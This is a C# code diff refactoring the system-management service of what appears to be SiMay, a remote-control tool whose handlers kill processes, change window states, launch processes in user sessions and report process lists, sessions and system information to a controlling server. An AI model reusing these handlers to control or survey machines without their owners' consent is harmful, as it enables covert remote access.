@@ -3,32 +3,30 @@ using SiMay.Basic;
 using SiMay.Core;
 using SiMay.Core.Common;
 using SiMay.Core.PacketModelBinder.Attributes;
-using SiMay.Core.PacketModelBinding;
 using SiMay.Core.Packets;
 using SiMay.Core.Packets.SysManager;
 using SiMay.ServiceCore.Attributes;
-using SiMay.ServiceCore.Extensions;
 using SiMay.ServiceCore.Helper;
-using SiMay.Sockets.Tcp;
 using SiMay.Sockets.Tcp.Session;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
-using System.Runtime.InteropServices;
 using System.Windows.Forms;
 using static SiMay.ServiceCore.CommonWin32Api;
-using System.Management;
-using SiMay.ServiceCore.Win32;
 
-namespace SiMay.ServiceCore.ApplicationService
+namespace SiMay.ServiceCore
 {
     [ServiceName("系统管理")]
     [ServiceKey(AppJobConstant.REMOTE_SYSMANAGER)]
-    public class SystemService : ServiceManagerBase
+    public class SystemService : ApplicationRemoteService
     {
         private ComputerInfo _memoryInfo = new ComputerInfo();
         private PerformanceCounter _cpuInfo = new PerformanceCounter("Processor", "% Processor Time", "_Total");
+        public override void SessionInited(TcpSocketSaeaSession session)
+        {
+
+        }
 
         public override void SessionClosed()
         {
@@ -38,7 +36,7 @@ namespace SiMay.ServiceCore.ApplicationService
         [PacketHandler(MessageHead.S_SYSTEM_KILL)]
         public void TryKillProcess(TcpSocketSaeaSession session)
         {
-            var processIds = session.CompletedBuffer.GetMessageEntity<SysKillPack>();
+            var processIds = GetMessageEntity<SysKillPack>(session);
             foreach (var id in processIds.ProcessIds)
             {
                 try
@@ -54,7 +52,7 @@ namespace SiMay.ServiceCore.ApplicationService
         [PacketHandler(MessageHead.S_SYSTEM_MAXIMIZE)]
         public void SetWindowState(TcpSocketSaeaSession session)
         {
-            var pack = session.CompletedBuffer.GetMessageEntity<SysWindowMaxPack>();
+            var pack = GetMessageEntity<SysWindowMaxPack>(session);
             int[] handlers = pack.Handlers;
             int state = pack.State;
 
@@ -82,7 +80,7 @@ namespace SiMay.ServiceCore.ApplicationService
         [PacketHandler(MessageHead.S_SYSTEM_CREATE_USER_PROCESS)]
         public void CreateProcessAsUser(TcpSocketSaeaSession session)
         {
-            var sessionId = session.CompletedBuffer.GetMessageEntity<CreateProcessAsUserPack>().SessionId;
+            var sessionId = GetMessageEntity<CreateProcessAsUserPack>(session).SessionId;
             UserTrunkContext.UserTrunkContextInstance.CreateProcessAsUser(sessionId);
         }
 
@@ -99,7 +97,7 @@ namespace SiMay.ServiceCore.ApplicationService
                 })
                 .ToArray();
 
-            SendAsyncToServer(MessageHead.C_SYSTEM_SESSIONS,
+            SendTo(CurrentSession, MessageHead.C_SYSTEM_SESSIONS,
                         new SessionsPack()
                         {
                             Sessions = sessions
@@ -129,7 +127,7 @@ namespace SiMay.ServiceCore.ApplicationService
             //    return p;
             //}).ToArray();
 
-            SendAsyncToServer(MessageHead.C_SYSTEM_PROCESS_LIST,
+            SendTo(CurrentSession, MessageHead.C_SYSTEM_PROCESS_LIST,
                 new ProcessListPack()
                 {
                     ProcessList = processList
@@ -148,7 +146,7 @@ namespace SiMay.ServiceCore.ApplicationService
         }
 
         [PacketHandler(MessageHead.S_SYSTEM_GET_SYSTEMINFO)]
-        public void HandlerGetSystemInfos(TcpSocketSaeaSession session)
+        public void GetSystemInfosHandler(TcpSocketSaeaSession session)
         {
             ThreadHelper.ThreadPoolStart(c =>
             {
@@ -261,7 +259,7 @@ namespace SiMay.ServiceCore.ApplicationService
                 });
                 var sysInfos = new SystemInfoPack();
                 sysInfos.SystemInfos = infos.ToArray();
-                SendAsyncToServer(MessageHead.C_SYSTEM_SYSTEMINFO, sysInfos);
+                SendTo(CurrentSession, MessageHead.C_SYSTEM_SYSTEMINFO, sysInfos);
             });
         }
 
@@ -275,7 +273,7 @@ namespace SiMay.ServiceCore.ApplicationService
             }
             catch { }
 
-            SendAsyncToServer(MessageHead.C_SYSTEM_OCCUPY_INFO,
+            SendTo(CurrentSession, MessageHead.C_SYSTEM_OCCUPY_INFO,
                 new SystemOccupyPack()
                 {
                     CpuUsage = cpuUserate,
